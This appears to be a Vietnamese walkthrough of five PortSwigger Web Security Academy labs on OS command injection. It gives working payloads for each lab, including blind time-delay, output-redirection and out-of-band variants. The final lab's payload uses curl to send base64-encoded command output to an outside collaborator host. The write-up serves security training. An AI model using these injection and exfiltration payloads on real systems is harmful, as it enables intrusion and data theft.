# OS command injection

# **Lab: OS command injection, simple case**

[Lab: OS command injection, simple case | Web Security Academy](https://portswigger.net/web-security/os-command-injection/lab-simple)

- Thực hiện truy cập vào product bất kỳ. Tại đây, thực hiện chức năng `Check stock`
    
    ![image.png](OS%20command%20injection/image.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /product/stock` .
    
    ![image.png](OS%20command%20injection/image%201.png)
    
- Thực hiện chèn payload sau vào tham số `storeId` .
    - Payload
        
        ```html
        |id
        ```
        
    - Response
        
        ![image.png](OS%20command%20injection/image%202.png)
        
- Hoàn thành việc giải lab
    
    ![image.png](OS%20command%20injection/image%203.png)
    

# **Lab: Blind OS command injection with time delays**

[Lab: Blind OS command injection with time delays | Web Security Academy](https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays)

- Thực hiện điều hướng vào chức năng `Submit feedback > Submit` . Thực hiện submit
    
    ![image.png](OS%20command%20injection/image%204.png)
    
- Trong phần mềm Burpsuite, thực hiện chỉnh sửa param `email` thành payload sau `& ping -c 10 127.0.0.1 &`
    - Request
        
        ```html
        POST /feedback/submit HTTP/2
        Host: 0add00cd03fb3799802f76aa00820096.web-security-academy.net
        Cookie: session=R26hdq7qd5g3jjiYMne5rJHusvG0WetH
        User-Agent: admin
        Accept: */*
        Accept-Language: en-US,en;q=0.9
        Accept-Encoding: gzip, deflate, br
        Referer: https://0add00cd03fb3799802f76aa00820096.web-security-academy.net/feedback
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 116
        Origin: https://0add00cd03fb3799802f76aa00820096.web-security-academy.net
        Sec-Fetch-Dest: empty
        Sec-Fetch-Mode: cors
        Sec-Fetch-Site: same-origin
        Priority: u=0
        Te: trailers
        
        csrf=AnYNFFxO8DPh9bib6pUQ0AOFFtdBLjyN&name=aa&email=%26%20ping%20-c%2010%20127.0.0.1%20%26&subject=aaaa&message=aaaa
        ```
        
    - Response
        
        ![image.png](OS%20command%20injection/image%205.png)
        
- Thực hiện sleep thành công. Hoàn thành giải lab
    
    ![image.png](OS%20command%20injection/image%206.png)
    

# **Lab: Blind OS command injection with output redirection**

[Lab: Blind OS command injection with output redirection | Web Security Academy](https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection)

- Điều hướng đến chức năng `Submit Feedback > Submit` .
    
    ![image.png](OS%20command%20injection/image%207.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /feedback/submit` và thay đổi tham số `email` với payload sau:
    - Payload
        
        ```html
        & echo $(id) > /var/www/images/a &
        ```
        
    - Response
        
        ![image.png](OS%20command%20injection/image%208.png)
        
- Thực hiện truy cập một ảnh, thay bằng file `a` để xem nội dung file
    
    ![image.png](OS%20command%20injection/image%209.png)
    
- Hoàn thành việc giải lab
    
    ![image.png](OS%20command%20injection/image%2010.png)
    

# **Lab: Blind OS command injection with out-of-band interaction**

[Lab: Blind OS command injection with out-of-band interaction | Web Security Academy](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band)

- Điều hướng đến chức năng `Submit Feedback > Submit` .
    
    ![image.png](OS%20command%20injection/image%2011.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /feedback/submit` và thay đổi tham số `email` với payload sau:
    - Payload
        
        ```html
        & nslookup vkjgcur1u8jmuirpslaeaxn0nrtih85x.oastify.com & 
        ```
        
    - Response
        
        ![image.png](OS%20command%20injection/image%2012.png)
        
- Quan sát tại lab collab, thấy có trigger. Hoàn thành giải lab
    
    ![image.png](OS%20command%20injection/image%2013.png)
    

# **Lab: Blind OS command injection with out-of-band data exfiltration**

[Lab: Blind OS command injection with out-of-band data exfiltration | Web Security Academy](https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration)

- Điều hướng đến chức năng `Submit Feedback > Submit` .
    
    ![image.png](OS%20command%20injection/image%2014.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt request gửi tới API `POST /feedback/submit` và thay đổi tham số `email` với payload sau:
    - Payload
        
        ```html
        & curl  http://ii4uen0f7bt9ijsdi88m7gi2htnkbb1zq.oastify.com/$(id | base64 -w0) &
        ```
        
    - Giải thích: khi dùng `$()` thì code trong đó sẽ thực thi trước, nhưng vì URL trả về không được chứa ký tự đặc biêt → base64 encode nhưng nếu chuỗi encoded quá dài thì sẽ trả về xuống dòng → `-w0`
    - Kết quả
        
        ![image.png](OS%20command%20injection/image%2015.png)
        
        ![image.png](OS%20command%20injection/image%2016.png)
        
- Submit solution và hoàn thành việc giải lab
    
    ![image.png](OS%20command%20injection/image%2017.png)